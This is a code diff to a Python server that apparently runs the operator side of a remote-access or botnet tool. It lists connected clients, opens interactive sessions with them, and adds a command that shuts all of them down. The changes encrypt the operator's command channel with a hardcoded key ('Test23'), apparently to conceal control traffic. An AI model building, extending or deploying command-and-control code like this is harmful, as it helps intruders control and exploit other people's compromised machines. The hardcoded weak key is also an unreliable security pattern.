@@ -8,6 +8,7 @@ import sys
 import time
 
 from database import *
+from encryption import *
 
 if (len(sys.argv) == 4):
 	port = int(sys.argv[1])
@@ -168,7 +169,8 @@ def main():
 		bridge.listen(0)
 		q,addr=bridge.accept()
 		cpass = q.recv(20480)
-		verifyUser(cpass)
+		Cpass = encryption().decrypt(cpass, "Test23")
+		verifyUser(Cpass)
 
 		timeout = time.time() + 500
 		breakit = False
@@ -182,16 +184,19 @@ def main():
 
 			try: 
 				message = q.recv(20480)
-				command = jsonDecode(message, "command")
+				Message = encryption().decrypt(message, "Test23")
+				command = jsonDecode(Message, "command")
 				print " [+] Recieved Command: {CMD}".format(CMD=command)
 			except: break
             
 			if (command == "accept"):
 				clients = getConnections()
+				clients = encryption().encrypt(clients, "Test23")
 				if (sendController(clients, q) == 0): break
 
 			elif(command == "list"):
 				clientList = listClients()
+				clientList = encryption().encrypt(clientList, "Test23")
 				sendController(clientList, q)
 
 			elif(command == "interact"):
@@ -199,10 +204,13 @@ def main():
 				if ((int(client) <= len(allAddresses)) and (int(client) >= 0 )):
 					body = {"status":"OK", "command":"interact", "reply": "Connecting To Client", "error": "null"}
 					reply = json.dumps(body) 
+					reply = encryption().encrypt(reply, "Test23")
 					sendController(reply, q)
 					inter = interact(int(client), timeout, q)
 				else:
-					reply = {"status":"ERROR", "command":"interact", "reply": " ", "error": "ID Out Of Range"}
+					body = {"status":"ERROR", "command":"interact", "reply": " ", "error": "ID Out Of Range"}
+					reply = json.dumps(body)
+					reply = encryption().encrypt(reply, "Test23")
 					sendController(reply, q)
 
 			#elif (command == "selfupdateall"):
@@ -211,13 +219,21 @@ def main():
 			#			item.send(command)
 			#		except:
 			#			pass
+			elif(command == "quitClients"):
+				quitClients()
+				
 			elif(command == "quit"):
-				#quitClients()
 				sendController(" [-] Goodbye", q)
 				q.close()
 				break
 			else:
-				if (sendController(" [!] I'm Affraid I Can't Let You Do That Dave", q) == 0): break
+				body = {"status":"ERROR", "command":"unknown",
+					"reply": "I'm Affraid I Can't Let You Do That Dave",
+					 "error": "ID Out Of Range"}
+				reply = json.dumps(body)
+				reply = encryption().encrypt(reply, "Test23")
+				if (sendController(reply, q) == 0): break
+				else:pass
 
 while True:
 	try:		
